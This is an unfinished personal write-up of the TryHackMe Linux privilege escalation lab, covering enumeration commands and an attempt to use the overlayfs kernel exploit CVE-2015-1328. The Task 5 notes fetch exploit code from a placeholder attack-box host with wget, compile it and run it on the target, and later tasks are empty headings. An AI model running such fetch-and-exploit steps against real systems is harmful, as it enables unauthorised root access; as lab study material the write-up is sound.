```
┃  ┛┏━ ┃ ┃┃ ┃  ┏━┃┏━┃┛┃ ┃┛┃  ┏━┛┏━┛┏━┛  ┏━┛┏━┛┏━┛┏━┃┃  ┏━┃━┏┛┛┏━┃┏━ 
┃  ┃┃ ┃┃ ┃ ┛   ┏━┛┏┏┛┃┃ ┃┃┃  ┏━┛┃ ┃┏━┛  ┏━┛━━┃┃  ┏━┃┃  ┏━┃ ┃ ┃┃ ┃┃ ┃
━━┛┛┛ ┛━━┛┛ ┛  ┛  ┛ ┛┛ ┛ ┛━━┛━━┛━━┛━━┛  ━━┛━━┛━━┛┛ ┛━━┛┛ ┛ ┛ ┛━━┛┛ ┛
```
In this TryHackMe room, we learn the fundamentals of Linux privilege escalation. From
enumeration to exploitation, we study different privilege escalation techniques. [^1]

Task 3: Enumeration
-----------------------------------------------------------------------------------------
**What is the hostname of the target system?**

The enumeration phase is the first step in exploring the system to discover potentially
fatal vulnerabilities and the final step, post-compromise. The `hostname` command returns
the hostname of our target system. It can not represent an identifier, but a goood idea
since most systems leave it at their default value.

**What is the Linux kernel version of the target system?**

With the `uname -a` command, we are able to get additional information about the kernel
used by the system.

**What Linux is this?**

From the previous command, we already know the Linux distribution. But instead, we want
to dig deeper with the `/etc/os-release` file and thus find out the pretty name for the
OS which is the answer to this task.

**What version of the Python language is installed on the system?**

We find out that there is both Python2 and Python3 installed, but for this task we want
the `python --version`.

**What vulnerability seem to affect the kernel of the target system?**

For this, we can search for the kernel version "3.13.0" in the Exploit Database [^2] and
discover the *CVE* for the vulnerability on local privilege escalation by clicking on one
of the two exploits and reading the docstring.

Task 5: Privilege Escalation: Kernel Exploits
-----------------------------------------------------------------------------------------
**Find and use the appropriate kernel exploit to gain root privileges on the target
system.**

At first, we check the username with whom we are logged in on the target machine, with
`whoami` and I find out that we are indeed karen. It is our objective in this task, to
gain *root* access without any knowledge of their credentials through a privilege
escalation exploit. In this kernel exploit methodology, we first identify the kernel
version, e.g. with `uname -a` which leads to the kernel version "3.13.0-24-generic",
same as before. We already searched for it in the Exploit Database [^2] and further
inform ourselves about the CVE "CVE-2015-1328" on the *National Vulnerability Database*
(NVD) [^3]. Here, we find out this kernel version has a problem in the "overlayfs"
implementation where Ubuntu does not properly check permissions for file creation in the
upper filesystem directory.

found flag in matt's home directory -> /home/matt/flag1.txt but can't open it without root privileges

wget https://www.exploit-db.com/download/37292
python3 -m http.server 8080

find / -user karen 2> /dev/null
/run/user/1001
wget <ATTACK_BOX_IP_ADDRESS>:8080/ofs.c
gcc ofs.c -o ofs
id -> uid-1001(karen) gid=1001(karen) groups=1001(karen)
./ofs -> Permission denied

TBC

**What is the content of the flag1.txt file?**

Task 6: Privilege Escalation: Sudo
-----------------------------------------------------------------------------------------

Task 7: Privilege Escalation: SUID
-----------------------------------------------------------------------------------------

Task 8: Privilege Escalation: Capabilities
-----------------------------------------------------------------------------------------

Task 9: Privilege Escalation: Cron Jobs
-----------------------------------------------------------------------------------------

Task 10: Privilege Escalation: PATH
-----------------------------------------------------------------------------------------

Task 11: Privilege Escalation: NFS
-----------------------------------------------------------------------------------------

Task 12: Capstone Challenge
-----------------------------------------------------------------------------------------

[^1]: https://tryhackme.com/room/linprivesc
[^2]: https://www.exploit-db.com/
[^3]: https://nvd.nist.gov/vuln/detail/CVE-2015-1328
